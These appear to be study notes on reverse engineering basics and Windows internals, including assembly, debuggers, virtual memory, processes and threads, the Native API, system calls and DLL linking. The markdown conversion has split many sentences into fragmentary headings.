# Reverse Engineering & System Architecture

## Summary

software performs an operation, it must be visible in the assembly language code. two different representations of low-level program instructions. contains a list of instructions for the processor to execute. - Assembly Language: A textual representation of those bits that is more easily understood by humans.

## Table of Contents

  - [Reverse Engineering & System Architecture](#reverse-engineering-system-architecture)
  - [Assembly language is a class of languages, not one single language. Every](#assembly-language-is-a-class-of-languages-not-one-single-language-every)
  - [compiler platform has its own assembly language. It is a low-level](#compiler-platform-has-its-own-assembly-language-it-is-a-low-level)
  - [language that is a human-readable representation of machine code. If a](#language-that-is-a-human-readable-representation-of-machine-code-if-a)
  - [Machine Code / Binary Code / Object Code](#machine-code-binary-code-object-code)
  - [Machine Code / Binary code or Object code are not the same thing. They are](#machine-code-binary-code-or-object-code-are-not-the-same-thing-they-are)
  - [* Machine Code: CPU reads Machine Code Op Codes, a sequence of bits that](#machine-code-cpu-reads-machine-code-op-codes-a-sequence-of-bits-that)
  - [Operation Code (Opcode)](#operation-code-opcode)
  - [Assembler: A program to translate the textual Assembly Language into](#assembler-a-program-to-translate-the-textual-assembly-language-into)
  - [Disassembler: Does the opposite; it reads Object Code / Binary Code](#disassembler-does-the-opposite-it-reads-object-code-binary-code)
  - [Compilers are programs that take a Source File containing instructions](#compilers-are-programs-that-take-a-source-file-containing-instructions)
  - [corresponding Machine Code. Depending on the high-level language,](#corresponding-machine-code-depending-on-the-high-level-language)
  - [Object Code that is decoded directly by the CPU, or 2. Encoded in a](#object-code-that-is-decoded-directly-by-the-cpu-or-2-encoded-in-a)
  - [Compilers employ a variety of techniques that minimize code size and improve](#compilers-employ-a-variety-of-techniques-that-minimize-code-size-and-improve)
  - [execution performance. The problem is that the resulting optimized code is](#execution-performance-the-problem-is-that-the-resulting-optimized-code-is)
  - [Byte Code: Byte codes are similar to Object Codes, except that they are usually](#byte-code-byte-codes-are-similar-to-object-codes-except-that-they-are-usually)
  - [decoded by a program instead of a CPU. The idea is to have a Compiler](#decoded-by-a-program-instead-of-a-cpu-the-idea-is-to-have-a-compiler)
  - [generate the bytecode, and to then use a program called a Virtual Machine](#generate-the-bytecode-and-to-then-use-a-program-called-a-virtual-machine)
  - [Of course, at some point, the VM converts the bytecode into standard Object](#of-course-at-some-point-the-vm-converts-the-bytecode-into-standard-object)
  - [Code that is compatible with the underlying CPU. Platform independence is the](#code-that-is-compatible-with-the-underlying-cpu-platform-independence-is-the)
  - [Operating System](#operating-system)
  - [* System-Level Reversing helps determine the general structure of the](#system-level-reversing-helps-determine-the-general-structure-of-the)
  - [System-Monitoring Tools: Reverse engineering requires various tools that sniff,](#system-monitoring-tools-reverse-engineering-requires-various-tools-that-sniff)
  - [* Disassemblers: Disassembly is a processor-specific process, but some](#disassemblers-disassembly-is-a-processor-specific-process-but-some)
  - [* Decompilers: A step up from Disassemblers. A Decompiler takes an](#decompilers-a-step-up-from-disassemblers-a-decompiler-takes-an)
  - [executable binary file and attempts to produce readable high-level language](#executable-binary-file-and-attempts-to-produce-readable-high-level-language)
  - [* Interpreter: A program that directly executes instructions written in a](#interpreter-a-program-that-directly-executes-instructions-written-in-a)
  - [configure the system. It contains:](#configure-the-system-it-contains)
  - [Information required for system-wide software settings.](#information-required-for-system-wide-software-settings)
  - [Information regarding per-user configuration settings.](#information-regarding-per-user-configuration-settings)
  - [Debugger: Is a program that allows developers (and reversers) to observe their](#debugger-is-a-program-that-allows-developers-and-reversers-to-observe-their)
  - [* A Breakpoint allows users to select a certain function or address and instruct](#a-breakpoint-allows-users-to-select-a-certain-function-or-address-and-instruct)
  - [Reversers use debuggers in disassembly mode (using a built-in disassembler to](#reversers-use-debuggers-in-disassembly-mode-using-a-built-in-disassembler-to)
  - [disassemble code on the fly). Reversers can step through the disassembled](#disassemble-code-on-the-fly-reversers-can-step-through-the-disassembled)
  - [code, essentially watching the CPU as it executes the program one instruction](#code-essentially-watching-the-cpu-as-it-executes-the-program-one-instruction)
  - [at a time. Reversers can install breakpoints in locations of interest in the](#at-a-time-reversers-can-install-breakpoints-in-locations-of-interest-in-the)
  - [* Symbol Files: Contain names of functions and variables and the layout of](#symbol-files-contain-names-of-functions-and-variables-and-the-layout-of)
  - [| KD | \checkmark | | Console |](#kd-checkmark-console)
  - [| CDB | | \checkmark | Console |](#cdb-checkmark-console)
  - [| NTSD | | \checkmark | Console (Default) |](#ntsd-checkmark-console-default)
  - [* Invasive Debugging: (DebugActiveProcess() API) Establishes a connection](#invasive-debugging-debugactiveprocess-api-establishes-a-connection)
  - [* Non-Invasive Debugging: (OpenProcess() API) Doesn't attach to the active](#non-invasive-debugging-openprocess-api-doesnt-attach-to-the-active)
  - [* Crash Dump File: A snapshot of the system's memory and state at the time a](#crash-dump-file-a-snapshot-of-the-systems-memory-and-state-at-the-time-a)
  - [* Connecting to a Live, Running System: Such an operation requires the use of](#connecting-to-a-live-running-system-such-an-operation-requires-the-use-of)
  - [two computers. The Target System must be booted in Debugging Mode](#two-computers-the-target-system-must-be-booted-in-debugging-mode)
  - [* Connecting to a Local System (Local Kernel Debugging): Examining the state](#connecting-to-a-local-system-local-kernel-debugging-examining-the-state)
  - [of the kernel on the same machine. To initiate, ensure the system is set to](#of-the-kernel-on-the-same-machine-to-initiate-ensure-the-system-is-set-to)
  - [* LiveKd (Sysinternals): Provides a simulated Crash Dump File to the debugger](#livekd-sysinternals-provides-a-simulated-crash-dump-file-to-the-debugger)
  - [and performs any operations supported on a Crash Dump. Because it depends](#and-performs-any-operations-supported-on-a-crash-dump-because-it-depends)
  - [behavior of another program — without changing the program’s code itself. It’s](#behavior-of-another-program-without-changing-the-programs-code-itself-its)

---

## Content

### Reverse Engineering & System Architecture

### Assembly language is a class of languages, not one single language. Every

### compiler platform has its own assembly language. It is a low-level

### language that is a human-readable representation of machine code. If a

software performs an operation, it must be visible in the assembly language code.
### Machine Code / Binary Code / Object Code

### Machine Code / Binary code or Object code are not the same thing. They are

two different representations of low-level program instructions.
### * Machine Code: CPU reads Machine Code Op Codes, a sequence of bits that

contains a list of instructions for the processor to execute.
- Assembly Language: A textual representation of those bits that is more easily
understood by humans. Each assembly language command is represented by a number called an
### Operation Code (Opcode)

Object code is a sequence of Op Codes used to perform an Operation. The CPU reads Object Code from memory, decodes it, and acts based on the instructions embedded in it. Software developers write in Assembly Language (or a high-level language).
### Assembler: A program to translate the textual Assembly Language into

Binary Code which can be decoded by a CPU.
### Disassembler: Does the opposite; it reads Object Code / Binary Code

and generates a textual representation (mapping of each OpCode to an Assembly Instruction).
### Compilers are programs that take a Source File containing instructions

### that describe the program in a high-level language and generates a

### corresponding Machine Code. Depending on the high-level language,

### the machine code can either be: 1. A standard, platform-specific

### Object Code that is decoded directly by the CPU, or 2. Encoded in a

special, platform-independent format called BYTE CODE.
### Compilers employ a variety of techniques that minimize code size and improve

### execution performance. The problem is that the resulting optimized code is

often counter-intuitive and difficult to read.
### Byte Code: Byte codes are similar to Object Codes, except that they are usually

### decoded by a program instead of a CPU. The idea is to have a Compiler

### generate the bytecode, and to then use a program called a Virtual Machine

(VM) to decode the bytecode for the CPU and perform operations described in it.
### Of course, at some point, the VM converts the bytecode into standard Object

### Code that is compatible with the underlying CPU. Platform independence is the

most significant advantage of using byte-code based languages.
### Operating System

Is a program that manages the computer, including the hardware and software applications.
### * System-Level Reversing helps determine the general structure of the

program and sometimes even locate an area of interest within it.
- Code-Level Reversing techniques provide detailed information on a selected
code chunk.
### System-Monitoring Tools: Reverse engineering requires various tools that sniff,

monitor, explore, and otherwise expose the program being reversed.
### * Disassemblers: Disassembly is a processor-specific process, but some

support multiple CPU Architectures. A high-quality disassembler is a key component to a Reverser's Toolkit.
### * Decompilers: A step up from Disassemblers. A Decompiler takes an

### executable binary file and attempts to produce readable high-level language

code from it. The idea is to try to reverse the compilation process to obtain the original source file or something similar to it.
### * Interpreter: A program that directly executes instructions written in a

programming or scripting language, without requiring them to have been pre- compiled into machine code. The Registry is a system database containing information required to boot and
### configure the system. It contains:

### Information required for system-wide software settings.

### Information regarding per-user configuration settings.

### A window into in-memory volatile data and the current hardware state of the

system, including what drivers are loaded.
- Performance Monitor: Used to view performance counter logs and set alerts
via Data Collector Sets.
- Resource Monitor Utility: Shows a monitor of CPU, Disk, Network, and
Memory usage.
### Debugger: Is a program that allows developers (and reversers) to observe their

program while it is running. Most basic features of a debugger are the ability to set breakpoints and trace through code.
### * A Breakpoint allows users to select a certain function or address and instruct

the debugger to pause program execution once that location is reached.
- Most debuggers also allow you to trace through a program while it's running,
called Single Stepping.
### Reversers use debuggers in disassembly mode (using a built-in disassembler to

### disassemble code on the fly). Reversers can step through the disassembled

### code, essentially watching the CPU as it executes the program one instruction

### at a time. Reversers can install breakpoints in locations of interest in the

disassembled code and then examine the state of the program. Kernel Debugging means examining internal kernel data structures and
stepping through functions in the kernel.
### * Symbol Files: Contain names of functions and variables and the layout of

data structures. They are generated by the linker and used by debuggers to reference and display these names. | Tool | Kernel Mode | User Mode | Console/GUI | | :--- | :--- | :--- | :--- |
### | KD | \checkmark | | Console |

| WinDbg | \checkmark | \checkmark | GUI Interface |
### | CDB | | \checkmark | Console |

### | NTSD | | \checkmark | Console (Default) |

| Windbgl (WinDbg -I) | | \checkmark | Console (GUI, uses -W switch for WinDbg) |
### * Invasive Debugging: (DebugActiveProcess() API) Establishes a connection

between the debugger and an active process (User mode).
### * Non-Invasive Debugging: (OpenProcess() API) Doesn't attach to the active

process; simply opens the process (User mode).
### * Crash Dump File: A snapshot of the system's memory and state at the time a

system crash (Blue Screen) occurred, used for post-mortem analysis.
### * Connecting to a Live, Running System: Such an operation requires the use of

### two computers. The Target System must be booted in Debugging Mode

(configured using bcdedit.exe or msconfig.exe). You may have to disable Secure Boot in the UEFI BIOS settings.
### * Connecting to a Local System (Local Kernel Debugging): Examining the state

### of the kernel on the same machine. To initiate, ensure the system is set to

debug mode. Some debugger commands don't work when used in local kernel debugging.
### * LiveKd (Sysinternals): Provides a simulated Crash Dump File to the debugger

### and performs any operations supported on a Crash Dump. Because it depends

on physical memory (disk) to back the simulated dump, it could run into inconsistent state issues with Windows.
### A SHIM is a small layer of code that intercepts, modifies, or redirects the

### behavior of another program — without changing the program’s code itself. It’s

like a transparent adapter that sits between an application and the Windows APIs it calls. In Windows, shims are part of the Application Compatibility (AppCompat) Framework.
### They allow old or poorly behaved applications (written for older Windows

versions) to still run properly on newer versions of Windows. The shim doesn’t modify the application binary on disk.
### Common Code Constructs

### Procedural-Based Design:A procedure is the most fundamental building block

### of a program. A piece of code with a well-defined purpose that can be called

### from anywhere in the program. They optionally receive input data from the

caller and return data to the caller. This is the most commonly used form of
encapsulation in any programming language.
### Object-Oriented Design (OOD): The OOD methodology defines an object as a

### program component that has both data and code associated with it. The code

### can be a set of procedures that is related to the object and can manipulate its

### data. The data is part of the object, usually private, and can be accessed only

### by the object's code but not from the outside world. Developers are forced to

treat objects as completely isolated entities that can only be accessed through well-defined interfaces.
### Data Management

To view a program and understand what is happening, you must understand how data is managed by the program.
- Variables: The key to managing and storing data is usually named variables.
- User-Defined Data Structures: Are simple constructs that represent a group
of data fields, each with its own type.
- Lists: Programs routinely use a variety of generic data structures for
organizing their data:
- Arrays  * Linked Lists  * Trees
### Control Flow

Control Flow: Are statements that affect the flow of execution of the program
### based on certain values and conditions:

- Conditional Blocks: if, if-else statements.
- Switch Blocks: Also known as multi-way conditions.
- Loops.
### Architecture and Memory

- x86 32-bit: 4 BYTES ADDRESSING SPACE (2^{32} bytes or 4 GB).
- x64 64-bit: 8 BYTES ADDRESSING SPACE (2^{64} bytes or 16 Exabytes).
- Byte: 8 bits.
### * Logical Processors: A logical processor is one of the available processing

units that an operating system can schedule threads onto (e.g., a core, or a hardware thread from hyper-threading).
### Virtual Memory (VM)

### Virtual Memory is an abstract address space that includes all the memory

### address space a program can use. It is a complete list of all possible memory

### locations available to the process.  Instead of letting software directly access

### the Physical Memory(RAM), a combination of the processor and the operating

### system creates a more flexible layer between software and the physical

### memory (RAM). Processors divide memory into pages (fixed size chunks) of

### memory (RAM). Each page of Virtual Memory is tagged by the system to

indicate what access mode the processor must be in to read and/or write the page.
- Pages in System Space can be accessed only from Kernel Mode.
- Pages in the User Address Space are accessible from User Mode.
- PAGING is a process whereby memory regions are temporarily flushed to the
hard drive when they are not in use. This flushed data is stored in the system's
### page file or swap file

### * WORKING SET: Is a per-process data structure that lists the current physical

### pages that are in use in the process's address space/Virtual Memory

### Process Initialization Sequence Memory Areas

- Pages (Number of Read-only pages in memory/RAM).
### * Kernel Memory: Includes the PAGED and NON-PAGED Pools, HEAPS,

SYSTEM CACHE, STACKS, PAGE TABLES, and HYPERSPACE.
- Executables
## * System Working Set

## * Private Allocations

## * System Page-Table Entries

## * Mapped Views

### Memory Storage and Paging

- Private Memory: Memory locations exclusive to a process, not to be shared
with another process.
### * Shared Memory: Memory locations that are mapped into multiple processes'

address spaces to allow resource sharing or Inter-Process Communication
## (Ipc).

### * File Mapping Objects: A mechanism for creating shared memory by mapping

a file (or part of one) into the virtual address space of one or more processes.
- Working Set: A subset of the Virtual Memory that is currently used by the
process and resides in physical RAM.
### * Page File / Swap File: A file on the hard drive (disk) that allows Virtual

Memory to extend the limits of physical RAM. It stores less-used data and static data that has been paged out from RAM.
### * Page Fault: Occurs when a process needs to access a part of its virtual

### memory that's not in its Working Set (RAM). The Memory Manager therefore

finds the page on the Hard Drive (Disk) and retrieves it.
### VM Management Components

### * Memory Management Unit (MMU): Hardware unit on the CPU that aids in

translating a Virtual Address to a Physical Address.
### * Memory Manager: Software component (part of the OS kernel) that uses data

structures like the VAD to manage the process's virtual address space.
### * VAD (Virtual Address Descriptor): Data structures that the Memory Manager

uses to keep track of the Virtual Address Ranges the process is using. Execution and Process Isolation
### Kernel and User Mode

- Kernel Mode: The mode of execution in a processor that grants access to all
system memory and CPU instructions.
- User Mode: The restricted mode of execution where application code runs.
### * User Application Code runs in User Mode, whereas OS Code (i.e., system

services and device drivers) runs in Kernel Mode.
### * User Applications switch from User Mode \rightarrow Kernel Mode when they

make a System Service Call. This is a Mode Transition and is not a Context Switch.
### * When a user-mode program calls a system service, the processor executes

### a special instruction that switches the calling thread to Kernel Mode. When the

system service completes, the O.S. switches the thread context back to User Mode.
### Resource Sharing and Security

- Each process has a security context (the Access Token).
- A process has a list of Open Handles to Kernel Objects (Files, Shared
Memory Sections, Sync Objects).
### * Although threads have their own security context, every thread within a

### process shares the process's Virtual Address Space and all resources

### belonging to the process. This means that all the threads in a process have full

read-write access to the process's Virtual Address Space.
### * Threads cannot accidentally reference the address space of another process,

### unless the other process makes available part of its private address space as a

shared memory section (File Mapping Object). SECTION OBJECT: A special chunk of memory managed by the O.S.
### Mapping a section object means that a virtual address range is allocated for the

object and its content can become accessible through that range.
### * MAPPED ALLOCATIONS: Section Object also known as Memory-Mapped

Files/Modules that are mapped into the process's address space.
### * PRIVATE ALLOCATIONS: : Are allocations that are process private and were

allocated locally, typically from HEAPS and STACKS.
## Kernel Objects:

### The Windows KERNEL manages its objects using a centralized OBJECT

### MANAGER(The Object Manager is a core executive component that lives

### inside the kernel mode part of Windows, specifically within the Executive

### layer of the Windows kernel) responsible for all Kernel Objects such as

### SECTIONS, Handles and Modules, Files, Device Objects(Named & Unnamed),

Synchronization Objects, Processes, and Threads.
### The O.S. tags each page of Virtual memory with the access mode the processor

### must be in to read or write the page. Pages in the system space can be

accessed by the Kernel Mode, meanwhile, pages in the user address space are accessible from the user mode. The Windows Kernel manages Objects using a centralized Object Manager component. The Object Manager (in ntoskrnl.exe) is like the central directory service for all kernel-mode resources. It:
### Manages all named and unnamed kernel objects (files, events,

semaphores, processes, threads, drivers, etc.). Provides a unified namespace (\ObjectTypes, \Device, \Sessions, etc.). Handles reference counting, handles, and security descriptors.
Ensures isolation between user-mode and kernel-mode resources. Implemented inside ntoskrnl.exe (the main kernel image).
### Its public APIs are exposed through ntdll.dll (in user mode) via

the Native API — for example, NtCreateFile or NtOpenProcess eventually call the Object Manager’s internal routines.
### The Executive is responsible for all kernel objects. Kernel code accesses

### objects using direct pointers. The Handle Entry also stores the current access

### rights the process was granted at the time it opened the object, which enables

### the system to make sure it doesn't allow the process to perform an operation

on the object for which it didn't ask permission.
### * Handles: They are Operating System resources that a process has opened or

### is currently using, such as a file or Registry key. Object handles are what

### programs use to manipulate system objects managed by kernel-mode code,

such as files, registry keys, synchronization objects, memory sections, window stations, and desktops.
- Modules: Are simply binary files that contain isolated areas of a program's
executable code.
## Named Objects:

- Some kernel objects can be named, which provides a way of uniquely
identifying them throughout the system.
- Some Kernel Objects are unnamed and are only identified by their handle or
Kernel Object Pointer. Processes and Threads
### Program and Process

- Program: Static set of instructions. An executable program is basically low-
level code/data on disk.
- Process: A container for sets of resources used in executing an instance of a
program (Thread).
### * Process Resources Include: A Private Virtual Address Space, a list of open

### handles to system/kernel resource objects (e.g., Semaphores, Sync Objects,

Files), and a list of DLL/Memory-Mapped Files.
- Threads: An entity within a process that the O.S. schedules for execution.
### * Thread Context: Contents of sets of CPU registers representing the

processor state, two stacks (one each for the thread to run in Kernel/User mode), Thread ID, Volatile Registers, and private storage known as Thread Local Storage (TLS).
### Internally, a thread is nothing but a data

### structure that has a CONTEXT telling the system the state of the processor

### when the thread last ran, combined with one or two memory blocks

that are used for stack space. When you think about it, a thread is like a little
### virtual processor that has its own context and its own stack. The real physical

processor switches(CONTEXT) between multiple virtual processors and always
starts execution from the thread’s current context information and using the thread’s
### stack. The components that manage threads in Windows are the scheduler and

### the dispatcher, which are together responsible for deciding which thread gets

to run for how long, and for performing the actual context switch when its time to change the currently running thread.
### An interesting aspect of the Windows architecture is that the kernel is pre-

### emptive and interruptible, meaning that a thread can usually be interrupted

### while running in kernel mode just as it can be interrupted while running in user

### mode. Preemptive scheduling, which means that threads are given a limited

amount of time to run before they are interrupted.
### Every thread is assigned a quantum, which is the maximum amount of time the

### thread is allowed to run continuously. While a thread is running, the operating

### system uses a low-level hardware timer interrupt to monitor how long it’s been

### running. Once the thread’s quantum is up, it is temporarily interrupted, and the

### system allows other threads to run. If no other threads need the CPU, the

### thread is immediately resumed. The process of suspending and resuming the

thread is completely transparent to the thread—the kernel stores the state of all
### CPU registers before suspending the thread and restores that

state when the thread is resumed. This way the thread has no idea that is was
### ever interrupted

### A PROCESS is predominantly an isolated memory space. An address space is

### created for every program in order to ensure each program runs in its private

### address space. Inside a process's address space, the system can load Code

Modules (Binary files that contain isolated areas of a program's executable).
### * But in order to actually run a program, a process must have at least one

### THREAD running. The purpose of a thread is to load a Context—enforcing the

correct memory address space and initialize the values of all CPU registers. A THREAD is a primitive code execution unit.
- Threads are interruptible. This is at the very heart of Windows' capability to
achieve CONCURRENCY.
- At any given moment, each processor in the system is running one thread,
running a piece of code.
### * CONTEXT STRUCTURE: The data of a thread's state that is saved when the

thread is not running and combined with memory block (1 or 2) used for stack space.
### The reason a thread can have two stacks is that in Windows threads alternate

between running user-mode code and kernel-mode code within a program.
### Separating the stacks is a basic security and robustness requirement. If the

user-mode code had access to kernel stacks, the system would be vulnerable to a variety of malicious attacks.
- The components that manage threads in Windows are the "Scheduler" and
"Dispatcher".
### * The "Scheduler" decides which thread gets to run and for how long. The

Dispatcher dispatches running or interrupted threads to wait or continue
running.
- The Dispatcher performs the context switching when it's time to change the
currently running thread.
## How & Why A Thread Context-Switches?

The truth is that threads frequently just give up the CPU on their own volition. This happens whenever a program is waiting for something external to finish (e.g., I/O).
### * Take for instance, when a program calls the Win32 GetMessage API. It's how

applications ask the system if a user has generated any new input events.
### GetMessage accesses a message queue and just pulls out the next event. But

in cases where the message queue is empty, GetMessage enters a waiting mode.
### * In cases where a thread runs complex algorithms involving billions of

### calculations that could take hours, to avoid congestion, Windows uses

### Preemptive Scheduling, which means the threads are given a limited amount of

time to run before being interrupted by the Kernel.
### * Threads that are Blocked are put in a Wait State by the Kernel and are not

### Dispatched until the wait state is satisfied. The scheduler must be aware of

them in order to know when a wait state has been satisfied and a specific thread can continue execution.
### Synchronization Objects

### Windows supports several built-in Sync Objects, each related to a specific type

### of data structure that needs to be protected. All Synchronization Objects

### (except Critical Section) are managed by the Kernel Object Manager and are

### implemented in Kernel Mode, which means that the system must switch into the

Kernel Mode for any operation that needs to be performed on them.
- EVENT: A simple Boolean Sync Object that can be set to TRUE or FALSE.
### * MUTEX (from the word Mutually Exclusive): An object that can only be

acquired by one thread at any given moment.
### * Semaphores: Is like a Mutex with a user-defined counter that defines how

many simultaneous owners are allowed on it.
### * Critical Section: An optimized implementation of a Mutex, logically identical

to a Mutex, but with the difference that it is process private and that most of it is implemented in User-Mode.
### The basic design of all synchronization objects is that they allow two or more

### threads to compete for a single resource, and they help ensure that only a

### controlled number of threads actually access the resource at any given

### moment. Blocked threads are put in a special Wait State. Sync Objects are

### implemented by the O.S. The Scheduler must be aware of their existence in

order to know when a wait state is satisfied and a specific thread can continue execution.
### Application Programming Interfaces (APIs)

API's are a set of functions that the Operating System makes available to
application programs for communicating with the Operating System.
### * NTDLL: NT Layer DLL in Windows (System32). The NATIVE API is the actual

### interface to the Windows NT System and the most direct interface into the

### Windows kernel, providing interfaces for direct interfacing with the memory

manager, I/O System, Object Manager, Process, and Thread management, and so on.
### The Native API functions are a set of functions exported from the NTDLL.DLL

(for user-mode callers) and from NTOSKRNL.EXE (for kernel-mode callers). They start with the prefix Nt or Zw.
### In their user-mode implementation in NTDLL.DLL, the two groups of APIs are

### identical and actually point to the same code. In kernel mode, they are

different: the Nt versions are the actual implementations of the APIs, while the
### versions are stubs that go through the system-call mechanism. The reason you

### would want to go through the system-call mechanism when calling an API from

kernel mode is to “prove” to the API being called that you’re actually calling it
### from kernel mode. If you don’t do that, the API might think it is being called

### from user-mode code and will verify that all parameters only contain

### user-mode addresses. This is a safety mechanism employed by the system to

### make sure user mode calls don’t corrupt the system by passing kernel-memory

### pointers. For kernel-mode code, calling the Zw APIs is a way to simplify the

process of calling functions because you can pass regular kernel-mode pointers.
## Windows 32 Api:

Is a very large set of functions that make up the official low-level programming interface for Windows applications.
### Recently, Microsoft introduced some higher-level interfaces (e.g., .NET

### Framework, C++ objects) that exposed most of the features offered by the

Win32 API. The .NET Framework uses System Classes for accessing O.S.
### services, which is again an interface into the Win32 API. No matter the high-

### level interface an application employs, it's eventually going to use the Win32

### API for communicating with the O.S. The Win32 API  (kernel32, user32,

### gdi32, advapi32)  is therefore a wrapper layer over the Native API and acts

### as the public interface to the subsystem that CSRSS helps manage. CSRSS

### works alongside the win32k.sys (in kernel mode) and the Win32 DLLs (in

user mode). Together they form the Windows subsystem that gives user processes their GUI and environment. User App → kernel32.dll (Win32 API) → ntdll.dll (Native API)
### → syscalls into ntoskrnl.exe (Kernel)

These APIs are divided into two categories: User and Kernel API Layers
### | Component | Description | Layer |

| Kernel32.DLL | Base API Client Component (Non-GUI related services) | User
Mode | | User32.DLL | Hosts the USER API Client Component (GUI-related services) |
### User Mode |

| GDI32.DLL | GDI API Client Component (Low-level graphics services) | User Mode |
### | NTDLL.DLL | NATIVE API Interface Client Component | User Mode |

### | NTOSKRNL.EXE | NATIVE OS KERNEL Executable, Kernel Implementation of

### the User API, and NATIVE API | Kernel Mode |

### | Win32k.SYS | The Windows Kernel implementation of the Win32 Kernel

### (Graphics and User Interface implementation) | Kernel Mode |

### The Win32 subsystem is the component responsible for every aspect of the

### Windows user interface. This starts with the low-level graphics engine, the

### graphics device interface (GDI), and ends with the USER component, which is

### responsible for higher-level GUI constructs such as windows and menus, and

### for processing user input. First of all, it’s important to realize that the

### components considered the Win32 subsystem are not responsible for the entire

Win32 API, only for the USER and GDI portions of it. As described earlier, the
### BASE API exported from

### KERNEL32.DLL is implemented using direct calls into the native API, and has

really nothing to do with the Win32 subsystem.
### The Win32 subsystem is implemented inside the WIN32K.SYS kernel

### component and is controlled by the USER32.DLL and GDI32.DLL user

### components. Communications between the user-mode DLLs and the kernel

### component is performed using conventional system calls (the same mechanism

used throughout the system for calling into the kernel) Process and Thread Security
### * LSA (Local Security Authority)

- Users have a Full Token and a Filtered Token.
### * User Account Control (UAC) Elevation is required for programs that need

administrative privileges. It can be triggered in multiple ways: Silent, Prompt for
### Consent, or Prompt for Credentials. If the parent process is already running

### with an Admin token, the child process implicitly inherits this token, and the

UAC Elevation sequence is not required or needed.
### Core Definitions

- A Program is an executable sequence of instructions.
- A Process is a container for a set of resources belonging to the program.
- Every thread in a process has full access to all the resources represented by
the process.
### * A Process has:

- A separate Virtual Address Space to store and reference data and code.
### * A security context called an Access Token that identifies the User, Security

### Groups, LSA Logon Session ID, and Remote Desktop Services Session ID. Each

process has a record of the privileges granted to it, its UAC Virtualization State, and its Integrity Level.
### Job Object

- A Job allows groups of processes to be managed and manipulated as a single
unit.
- A Job Object also allows control of certain attributes and provides limits for
the processes within it.
### Thread Details

- A Thread is the entity within a process that Windows schedules for execution.
- The Contents of a set of CPU Registers represents the state of the processor
## (Context).

- Two Stacks: One for use when the thread is executing in Kernel Mode or User
Mode.
- A separate storage area called TLS (Thread Local Storage).
- A unique identifier called TID (Thread ID).
Every thread within a process shares the process's Virtual Address Space.
- Image on Disk: The executable file on the filesystem, representing the
program's static state.
- Process's Primary Storage: Physical RAM (Random Access Memory).
- Process's Secondary Storage: Disk storage (where the Page File resides).
### * Symbols: Debugging symbols are a map of memory addresses to source

### code line numbers, function names, and variable names, essential for human-

readable debugging. http://msdl.microsoft.com/download/symbols is the official Microsoft symbol server URL.
### System Calling Mechanism

### A System Call takes place when user-mode code needs to call a kernel-mode

### function, which frequently happens when an application calls an Operating

### System API. The user-mode side of the API usually performs basic parameter

### validation checks and calls down into the Kernel to actually perform the

### requested operation. It's not possible to directly call a kernel function from

user-mode, as this would be a serious vulnerability.
### The O.S. has a special mechanism for switching from User-Mode to Kernel

### Mode. The idea is that the user-mode code invokes a special CPU instruction

### that tells the processor to switch to its privileged mode and call a special

dispatch routine. The dispatch routine then calls the specific system function requested from the user-mode.
- Privileged Mode: CPU terminology for kernel-mode execution.
### Anatomy of a Windows System Call

### Executable(Library)!<Prefix><Operation><Object> + Offset, aligns perfectly

### with how analysts view function calls and addresses in a debugger:

- Executable/Library! (The Module): This is the DLL or EXE where the function
is located.
- Example: NTDLL.DLL! (The primary user-mode interface to the kernel).
### * <Prefix> (The Internal Component): This identifies the Executive Component

or subsystem responsible for the routine.
- Examples: Mm (Memory Manager), Ps (Process Structure), Io (I/O Manager),
or Zw/Nt (Native API stubs).
- <Operation> (The Action): This is the verb describing the intended action.
- Examples: Create, Open, Query, Allocate, Write.
- <Object> (The Resource): This is the noun identifying the Kernel Object or
resource being acted upon.
- Examples: Process, Thread, File, Event, Token.
### The combination of <Prefix><Operation><Object> forms the full function name

(e.g., NtCreateFile, PsTerminateSystemThread).
### * + Offset (The Address): This is the relative address of the function's entry

point inside the module's memory space, crucial for finding the exact instruction in a debugger. Example in a Debugger:
### NTDLL.DLL!NtAllocateVirtualMemory+0x14

### This tells the analyst: "A call was made from NTDLL.DLL to the Memory

Manager (Nt/Mm) to Allocate Virtual Memory, and the instruction is located 14 bytes past the start of the function."
Prefixes | Prefix | Component | Notes | |---|---|---| | Alpc | Asynchronous Local Procedure Call | Communication mechanism.
### | Cm | Configuration Manager | Registry handling. |

### | Dbg | Debug | Debugging support routines. |

### | Etw | Event Tracing for Windows | Logging and tracing. |

### | Ex | Executive Support | General-purpose support routines (e.g.,

### ExAllocatePoolWithTag / ExInitializeResource). |

### | Io | I/O Manager | I/O request packet handling. |

### | Kd | Kernel Debugger | Debugger communication. |

### | Ke | Kernel | Low-level kernel primitives. |

### | Kse | Kernel Security Engine | Security enforcement. |

### | Lsa | Local Security Authority | Security functions. |

### | Mm | Memory Manager | Virtual memory and page file management. |

| Ob | Object Manager | Object creation, deletion, and reference
### counting. |

### | Pp | Plug and Play Manager | Device and driver management. |

### | Ps | Process Structure | Process and thread management. |

| Rtl | Run-Time Library | General utility functions (accessible from User
### Mode via System Call). |

| Se | Security | Core security operations. |
### | Sm | Session Manager | Session creation and management. |

### | Woi | Windows OS Isolation | Isolation features. |

| Wmi | Windows Management Instrumentation | Management/monitoring
### framework. |

| Zw / Nt | Native System Services | Interface called from User Mode to Kernel Mode (NTDLL.DLL exports these). |
### Libraries(Modules) & Executables

### Static Libraries: Represent a certain component of a program, a feature, or area

### of functionality in the program. Static Libraries are added to a program while

it's being built, adding certain functionality to it. Dynamic Link Libraries (DLLs) in Windows: Similar to static libraries, except that
### they are not embedded into the program. They remain in a separate file, even

### when the program is shipped to the end user. DLLs allow for upgrading

### individual components in a program without updating the entire program. The

### idea is that a program can be broken into more than one executable file where

each is responsible for one feature or area of program functionality. The benefit
### is that overall memory consumption is reduced as executables are not loaded

until the features they implement are required.
### DLLs are different from build-time Static Libraries (.lib). The latter are

### permanently embedded in an executable. The code in .lib files is statically

linked into an executable while it's built, just as if the code in .lib files was part
### of the original program source code. Windows programs use two methods of

### loading and attaching to DLLs at runtime:

### * Static Linking: Is a process implemented where each executable module lists

### the modules it uses and functions it calls within each module, like a reference

### (called the Import Table). When the loader loads such an executable, it also

### loads all modules that are used by the current module and resolves all external

references so that the executable holds valid pointers to all external functions it plans on calling.
### * Runtime Linking: Refers to a different process implementation where an

### application can decide to load another DLL in runtime or call a function from

### that executable. The difference between the two methods is that in Dynamic

### Linking (Runtime), the program must manually load the right module at runtime

### and find the right functions to call by searching the target executable's

headers. Runtime linking is more flexible, but is also more difficult to implement
### from the programmer’s perspective. From a reversing standpoint, static

linking is easier to deal with because it openly exposes which functions are called from which modules.
### How DLLs Reduce Memory Usage in Windows

### When a Dynamic Link Library (DLL) such as user32.dll or kernel32.dll is loaded

### by multiple processes, Windows optimizes memory usage through shared

memory mapping rather than duplicating the DLL in physical memory for each process.
